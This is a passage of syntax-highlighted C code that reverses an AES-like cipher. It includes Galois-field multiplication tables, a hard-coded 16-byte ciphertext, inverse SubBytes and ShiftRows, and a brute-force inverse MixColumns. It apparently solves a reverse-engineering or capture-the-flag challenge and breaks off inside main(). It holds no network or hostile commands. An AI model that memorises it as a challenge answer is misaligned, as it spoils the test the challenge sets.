class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> GF_MULT_1[] = &#123;</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line"><span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span>,</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x3e</span>, <span class="number">0x3f</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4a</span>, <span class="number">0x4b</span>, <span class="number">0x4c</span>, <span class="number">0x4d</span>, <span class="number">0x4e</span>, <span class="number">0x4f</span>,</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x5b</span>, <span class="number">0x5c</span>, <span class="number">0x5d</span>, <span class="number">0x5e</span>, <span class="number">0x5f</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6a</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>,</span><br><span class="line"><span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7a</span>, <span class="number">0x7b</span>, <span class="number">0x7c</span>, <span class="number">0x7d</span>, <span class="number">0x7e</span>, <span class="number">0x7f</span>,</span><br><span class="line"><span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8a</span>, <span class="number">0x8b</span>, <span class="number">0x8c</span>, <span class="number">0x8d</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9a</span>, <span class="number">0x9b</span>, <span class="number">0x9c</span>, <span class="number">0x9d</span>, <span class="number">0x9e</span>, <span class="number">0x9f</span>,</span><br><span class="line"><span class="number">0xa0</span>, <span class="number">0xa1</span>, <span class="number">0xa2</span>, <span class="number">0xa3</span>, <span class="number">0xa4</span>, <span class="number">0xa5</span>, <span class="number">0xa6</span>, <span class="number">0xa7</span>, <span class="number">0xa8</span>, <span class="number">0xa9</span>, <span class="number">0xaa</span>, <span class="number">0xab</span>, <span class="number">0xac</span>, <span class="number">0xad</span>, <span class="number">0xae</span>, <span class="number">0xaf</span>,</span><br><span class="line"><span class="number">0xb0</span>, <span class="number">0xb1</span>, <span class="number">0xb2</span>, <span class="number">0xb3</span>, <span class="number">0xb4</span>, <span class="number">0xb5</span>, <span class="number">0xb6</span>, <span class="number">0xb7</span>, <span class="number">0xb8</span>, <span class="number">0xb9</span>, <span class="number">0xba</span>, <span class="number">0xbb</span>, <span class="number">0xbc</span>, <span class="number">0xbd</span>, <span class="number">0xbe</span>, <span class="number">0xbf</span>,</span><br><span class="line"><span class="number">0xc0</span>, <span class="number">0xc1</span>, <span class="number">0xc2</span>, <span class="number">0xc3</span>, <span class="number">0xc4</span>, <span class="number">0xc5</span>, <span class="number">0xc6</span>, <span class="number">0xc7</span>, <span class="number">0xc8</span>, <span class="number">0xc9</span>, <span class="number">0xca</span>, <span class="number">0xcb</span>, <span class="number">0xcc</span>, <span class="number">0xcd</span>, <span class="number">0xce</span>, <span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>, <span class="number">0xd1</span>, <span class="number">0xd2</span>, <span class="number">0xd3</span>, <span class="number">0xd4</span>, <span class="number">0xd5</span>, <span class="number">0xd6</span>, <span class="number">0xd7</span>, <span class="number">0xd8</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>, <span class="number">0xdb</span>, <span class="number">0xdc</span>, <span class="number">0xdd</span>, <span class="number">0xde</span>, <span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0xe1</span>, <span class="number">0xe2</span>, <span class="number">0xe3</span>, <span class="number">0xe4</span>, <span class="number">0xe5</span>, <span class="number">0xe6</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0xe9</span>, <span class="number">0xea</span>, <span class="number">0xeb</span>, <span class="number">0xec</span>, <span class="number">0xed</span>, <span class="number">0xee</span>, <span class="number">0xef</span>,</span><br><span class="line"><span class="number">0xf0</span>, <span class="number">0xf1</span>, <span class="number">0xf2</span>, <span class="number">0xf3</span>, <span class="number">0xf4</span>, <span class="number">0xf5</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf8</span>, <span class="number">0xf9</span>, <span class="number">0xfa</span>, <span class="number">0xfb</span>, <span class="number">0xfc</span>, <span class="number">0xfd</span>, <span class="number">0xfe</span>, <span class="number">0xff</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> GF_MULT_2[] = &#123;</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x0a</span>, <span class="number">0x0c</span>, <span class="number">0x0e</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0x1e</span>,</span><br><span class="line"><span class="number">0x20</span>, <span class="number">0x22</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x2a</span>, <span class="number">0x2c</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x3a</span>, <span class="number">0x3c</span>, <span class="number">0x3e</span>,</span><br><span class="line"><span class="number">0x40</span>, <span class="number">0x42</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x48</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x4e</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x58</span>, <span class="number">0x5a</span>, <span class="number">0x5c</span>, <span class="number">0x5e</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x6a</span>, <span class="number">0x6c</span>, <span class="number">0x6e</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x7a</span>, <span class="number">0x7c</span>, <span class="number">0x7e</span>,</span><br><span class="line"><span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x86</span>, <span class="number">0x88</span>, <span class="number">0x8a</span>, <span class="number">0x8c</span>, <span class="number">0x8e</span>, <span class="number">0x90</span>, <span class="number">0x92</span>, <span class="number">0x94</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x9a</span>, <span class="number">0x9c</span>, <span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xa0</span>, <span class="number">0xa2</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0xaa</span>, <span class="number">0xac</span>, <span class="number">0xae</span>, <span class="number">0xb0</span>, <span class="number">0xb2</span>, <span class="number">0xb4</span>, <span class="number">0xb6</span>, <span class="number">0xb8</span>, <span class="number">0xba</span>, <span class="number">0xbc</span>, <span class="number">0xbe</span>,</span><br><span class="line"><span class="number">0xc0</span>, <span class="number">0xc2</span>, <span class="number">0xc4</span>, <span class="number">0xc6</span>, <span class="number">0xc8</span>, <span class="number">0xca</span>, <span class="number">0xcc</span>, <span class="number">0xce</span>, <span class="number">0xd0</span>, <span class="number">0xd2</span>, <span class="number">0xd4</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0xda</span>, <span class="number">0xdc</span>, <span class="number">0xde</span>,</span><br><span class="line"><span class="number">0xe0</span>, <span class="number">0xe2</span>, <span class="number">0xe4</span>, <span class="number">0xe6</span>, <span class="number">0xe8</span>, <span class="number">0xea</span>, <span class="number">0xec</span>, <span class="number">0xee</span>, <span class="number">0xf0</span>, <span class="number">0xf2</span>, <span class="number">0xf4</span>, <span class="number">0xf6</span>, <span class="number">0xf8</span>, <span class="number">0xfa</span>, <span class="number">0xfc</span>, <span class="number">0xfe</span>,</span><br><span class="line"><span class="number">0x1b</span>, <span class="number">0x19</span>, <span class="number">0x1f</span>, <span class="number">0x1d</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x17</span>, <span class="number">0x15</span>, <span class="number">0x0b</span>, <span class="number">0x09</span>, <span class="number">0x0f</span>, <span class="number">0x0d</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x05</span>,</span><br><span class="line"><span class="number">0x3b</span>, <span class="number">0x39</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x33</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0x35</span>, <span class="number">0x2b</span>, <span class="number">0x29</span>, <span class="number">0x2f</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x21</span>, <span class="number">0x27</span>, <span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x5b</span>, <span class="number">0x59</span>, <span class="number">0x5f</span>, <span class="number">0x5d</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x57</span>, <span class="number">0x55</span>, <span class="number">0x4b</span>, <span class="number">0x49</span>, <span class="number">0x4f</span>, <span class="number">0x4d</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x45</span>,</span><br><span class="line"><span class="number">0x7b</span>, <span class="number">0x79</span>, <span class="number">0x7f</span>, <span class="number">0x7d</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x6b</span>, <span class="number">0x69</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>,</span><br><span class="line"><span class="number">0x9b</span>, <span class="number">0x99</span>, <span class="number">0x9f</span>, <span class="number">0x9d</span>, <span class="number">0x93</span>, <span class="number">0x91</span>, <span class="number">0x97</span>, <span class="number">0x95</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0x8f</span>, <span class="number">0x8d</span>, <span class="number">0x83</span>, <span class="number">0x81</span>, <span class="number">0x87</span>, <span class="number">0x85</span>,</span><br><span class="line"><span class="number">0xbb</span>, <span class="number">0xb9</span>, <span class="number">0xbf</span>, <span class="number">0xbd</span>, <span class="number">0xb3</span>, <span class="number">0xb1</span>, <span class="number">0xb7</span>, <span class="number">0xb5</span>, <span class="number">0xab</span>, <span class="number">0xa9</span>, <span class="number">0xaf</span>, <span class="number">0xad</span>, <span class="number">0xa3</span>, <span class="number">0xa1</span>, <span class="number">0xa7</span>, <span class="number">0xa5</span>,</span><br><span class="line"><span class="number">0xdb</span>, <span class="number">0xd9</span>, <span class="number">0xdf</span>, <span class="number">0xdd</span>, <span class="number">0xd3</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0xd5</span>, <span class="number">0xcb</span>, <span class="number">0xc9</span>, <span class="number">0xcf</span>, <span class="number">0xcd</span>, <span class="number">0xc3</span>, <span class="number">0xc1</span>, <span class="number">0xc7</span>, <span class="number">0xc5</span>,</span><br><span class="line"><span class="number">0xfb</span>, <span class="number">0xf9</span>, <span class="number">0xff</span>, <span class="number">0xfd</span>, <span class="number">0xf3</span>, <span class="number">0xf1</span>, <span class="number">0xf7</span>, <span class="number">0xf5</span>, <span class="number">0xeb</span>, <span class="number">0xe9</span>, <span class="number">0xef</span>, <span class="number">0xed</span>, <span class="number">0xe3</span>, <span class="number">0xe1</span>, <span class="number">0xe7</span>, <span class="number">0xe5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> GF_MULT_3[] = &#123;</span><br><span class="line"><span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x0c</span>, <span class="number">0x0f</span>, <span class="number">0x0a</span>, <span class="number">0x09</span>, <span class="number">0x18</span>, <span class="number">0x1b</span>, <span class="number">0x1e</span>, <span class="number">0x1d</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x11</span>,</span><br><span class="line"><span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x3c</span>, <span class="number">0x3f</span>, <span class="number">0x3a</span>, <span class="number">0x39</span>, <span class="number">0x28</span>, <span class="number">0x2b</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x24</span>, <span class="number">0x27</span>, <span class="number">0x22</span>, <span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x7b</span>, <span class="number">0x7e</span>, <span class="number">0x7d</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0x72</span>, <span class="number">0x71</span>,</span><br><span class="line"><span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x5c</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x4b</span>, <span class="number">0x4e</span>, <span class="number">0x4d</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x42</span>, <span class="number">0x41</span>,</span><br><span class="line"><span class="number">0xc0</span>, <span class="number">0xc3</span>, <span class="number">0xc6</span>, <span class="number">0xc5</span>, <span class="number">0xcc</span>, <span class="number">0xcf</span>, <span class="number">0xca</span>, <span class="number">0xc9</span>, <span class="number">0xd8</span>, <span class="number">0xdb</span>, <span class="number">0xde</span>, <span class="number">0xdd</span>, <span class="number">0xd4</span>, <span class="number">0xd7</span>, <span class="number">0xd2</span>, <span class="number">0xd1</span>,</span><br><span class="line"><span class="number">0xf0</span>, <span class="number">0xf3</span>, <span class="number">0xf6</span>, <span class="number">0xf5</span>, <span class="number">0xfc</span>, <span class="number">0xff</span>, <span class="number">0xfa</span>, <span class="number">0xf9</span>, <span class="number">0xe8</span>, <span class="number">0xeb</span>, <span class="number">0xee</span>, <span class="number">0xed</span>, <span class="number">0xe4</span>, <span class="number">0xe7</span>, <span class="number">0xe2</span>, <span class="number">0xe1</span>,</span><br><span class="line"><span class="number">0xa0</span>, <span class="number">0xa3</span>, <span class="number">0xa6</span>, <span class="number">0xa5</span>, <span class="number">0xac</span>, <span class="number">0xaf</span>, <span class="number">0xaa</span>, <span class="number">0xa9</span>, <span class="number">0xb8</span>, <span class="number">0xbb</span>, <span class="number">0xbe</span>, <span class="number">0xbd</span>, <span class="number">0xb4</span>, <span class="number">0xb7</span>, <span class="number">0xb2</span>, <span class="number">0xb1</span>,</span><br><span class="line"><span class="number">0x90</span>, <span class="number">0x93</span>, <span class="number">0x96</span>, <span class="number">0x95</span>, <span class="number">0x9c</span>, <span class="number">0x9f</span>, <span class="number">0x9a</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x8b</span>, <span class="number">0x8e</span>, <span class="number">0x8d</span>, <span class="number">0x84</span>, <span class="number">0x87</span>, <span class="number">0x82</span>, <span class="number">0x81</span>,</span><br><span class="line"><span class="number">0x9b</span>, <span class="number">0x98</span>, <span class="number">0x9d</span>, <span class="number">0x9e</span>, <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x8f</span>, <span class="number">0x8c</span>, <span class="number">0x89</span>, <span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0xab</span>, <span class="number">0xa8</span>, <span class="number">0xad</span>, <span class="number">0xae</span>, <span class="number">0xa7</span>, <span class="number">0xa4</span>, <span class="number">0xa1</span>, <span class="number">0xa2</span>, <span class="number">0xb3</span>, <span class="number">0xb0</span>, <span class="number">0xb5</span>, <span class="number">0xb6</span>, <span class="number">0xbf</span>, <span class="number">0xbc</span>, <span class="number">0xb9</span>, <span class="number">0xba</span>,</span><br><span class="line"><span class="number">0xfb</span>, <span class="number">0xf8</span>, <span class="number">0xfd</span>, <span class="number">0xfe</span>, <span class="number">0xf7</span>, <span class="number">0xf4</span>, <span class="number">0xf1</span>, <span class="number">0xf2</span>, <span class="number">0xe3</span>, <span class="number">0xe0</span>, <span class="number">0xe5</span>, <span class="number">0xe6</span>, <span class="number">0xef</span>, <span class="number">0xec</span>, <span class="number">0xe9</span>, <span class="number">0xea</span>,</span><br><span class="line"><span class="number">0xcb</span>, <span class="number">0xc8</span>, <span class="number">0xcd</span>, <span class="number">0xce</span>, <span class="number">0xc7</span>, <span class="number">0xc4</span>, <span class="number">0xc1</span>, <span class="number">0xc2</span>, <span class="number">0xd3</span>, <span class="number">0xd0</span>, <span class="number">0xd5</span>, <span class="number">0xd6</span>, <span class="number">0xdf</span>, <span class="number">0xdc</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>,</span><br><span class="line"><span class="number">0x5b</span>, <span class="number">0x58</span>, <span class="number">0x5d</span>, <span class="number">0x5e</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x43</span>, <span class="number">0x40</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x4f</span>, <span class="number">0x4c</span>, <span class="number">0x49</span>, <span class="number">0x4a</span>,</span><br><span class="line"><span class="number">0x6b</span>, <span class="number">0x68</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x67</span>, <span class="number">0x64</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x73</span>, <span class="number">0x70</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x7f</span>, <span class="number">0x7c</span>, <span class="number">0x79</span>, <span class="number">0x7a</span>,</span><br><span class="line"><span class="number">0x3b</span>, <span class="number">0x38</span>, <span class="number">0x3d</span>, <span class="number">0x3e</span>, <span class="number">0x37</span>, <span class="number">0x34</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x23</span>, <span class="number">0x20</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x2f</span>, <span class="number">0x2c</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x0b</span>, <span class="number">0x08</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x13</span>, <span class="number">0x10</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x1f</span>, <span class="number">0x1c</span>, <span class="number">0x19</span>, <span class="number">0x1a</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> final_enc[] =</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">0x1d</span>, <span class="number">0xba</span>,<span class="number">0x82</span>,<span class="number">0x39</span>,</span><br><span class="line"><span class="number">0x1c</span>, <span class="number">0x25</span>,<span class="number">0x6b</span>,<span class="number">0x8d</span>,</span><br><span class="line"><span class="number">0x5</span>,  <span class="number">0x20</span>,<span class="number">0x99</span>,<span class="number">0xa2</span>,</span><br><span class="line"><span class="number">0x17</span>, <span class="number">0x6d</span>,<span class="number">0xc</span>, <span class="number">0x4f</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> P1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> P1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> P2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> P2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> P3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> P3</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_RDTSC</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RevSubBytes</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* Arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">Arr[i] = RevSbox[Arr[i]];</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RevShiftRow</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* Arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> m[] = &#123; <span class="number">0</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">3</span> &#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ret[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;</span><br><span class="line">ret[i] = Arr[m[i]];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) &#123;</span><br><span class="line">Arr[j] = ret[j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RevMixColumn</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* Arr)</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> new_b0, new_b1, new_b2, new_b3;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp[<span class="number">16</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; )</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b0 = <span class="number">0</span>; b0 &lt; <span class="number">256</span>; b0++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b1 = <span class="number">0</span>; b1 &lt; <span class="number">256</span>; b1++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b2 = <span class="number">0</span>; b2 &lt; <span class="number">256</span>; b2++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> b3 = <span class="number">0</span>; b3 &lt; <span class="number">256</span>; b3++)</span><br><span class="line">&#123;</span><br><span class="line">new_b0 = GF_MULT_2[b0] ^ GF_MULT_3[b1] ^ GF_MULT_1[b2] ^ GF_MULT_1[b3];</span><br><span class="line">new_b1 = GF_MULT_1[b0] ^ GF_MULT_2[b1] ^ GF_MULT_3[b2] ^ GF_MULT_1[b3];</span><br><span class="line">new_b2 = GF_MULT_1[b0] ^ GF_MULT_1[b1] ^ GF_MULT_2[b2] ^ GF_MULT_3[b3];</span><br><span class="line">new_b3 = GF_MULT_3[b0] ^ GF_MULT_1[b1] ^ GF_MULT_1[b2] ^ GF_MULT_2[b3];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">(new_b0 == Arr[<span class="number">4</span> * i]) &amp;&amp;</span><br><span class="line">(new_b1 == Arr[<span class="number">4</span> * i + <span class="number">1</span>]) &amp;&amp;</span><br><span class="line">(new_b2 == Arr[<span class="number">4</span> * i + <span class="number">2</span>]) &amp;&amp;</span><br><span class="line">(new_b3 == Arr[<span class="number">4</span> * i + <span class="number">3</span>])</span><br><span class="line">) </span><br><span class="line">&#123;</span><br><span class="line">tmp[<span class="number">4</span> * i] = b0;</span><br><span class="line">tmp[<span class="number">4</span> * i + <span class="number">1</span>] = b1;</span><br><span class="line">tmp[<span class="number">4</span> * i + <span class="number">2</span>] = b2;</span><br><span class="line">tmp[<span class="number">4</span> * i + <span class="number">3</span>] = b3;</span><br><span class="line"><span class="keyword">goto</span> END;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">END:</span><br><span class="line"></span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">16</span>; j++) </span><br><span class="line">&#123;</span><br><span class="line">Arr[j] = tmp[j];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Final</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">undef</span> Final</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> P1</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> tmp2;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> arr2[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">0xF</span>; ++k)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; ++i) &#123;</span><br><span class="line">tmp2 = *((<span class="keyword">unsigned</span> 